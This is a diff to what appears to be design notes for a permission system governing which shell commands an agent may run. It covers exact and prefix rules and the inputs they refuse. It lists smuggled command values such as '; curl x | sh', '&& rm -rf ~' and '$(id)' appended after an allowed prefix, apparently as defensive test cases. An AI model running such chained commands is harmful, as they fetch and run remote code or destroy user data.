@@ -930,9 +930,8 @@ migrates it inside `BEGIN IMMEDIATE`.
   `C:\Windows\System32\cmd.exe /c`, `cmd/c`, `cmd,/c`, `cmd=/c`, `@cmd /c`, `,cmd/c`, `python3.12 a.py`,
   `nice sudo sh -c`, a variable, an escaped letter, a glob, a brace expansion, each of the seven curly
   quotes PowerShell reads, a one-word prefix, `>`, `<(` and PowerShell's `( )`, each refused as an exact
-  command and as a prefix, while
-  `git status --short` five times gives that command exact and `go test ./internal/a` and
-  `go test ./internal/b` give `go test *`. A prefix snippet pasted above the rule that asked in the
+  command and as a prefix, while `git status --short` five times gives that command exact and
+  `go test ./internal/a` and `go test ./internal/b` give `go test *`. A prefix snippet pasted above the rule that asked in the
   balanced preset allows `git push origin feature --force`, as its comment says, while `; curl x | sh`,
   `&& rm -rf ~`, `$(id)`, a line break and a redirect after the prefix ask, each by one of its asks. An
   allow for a tool that is not a shell says it allows every call. A snippet whose tool name holds
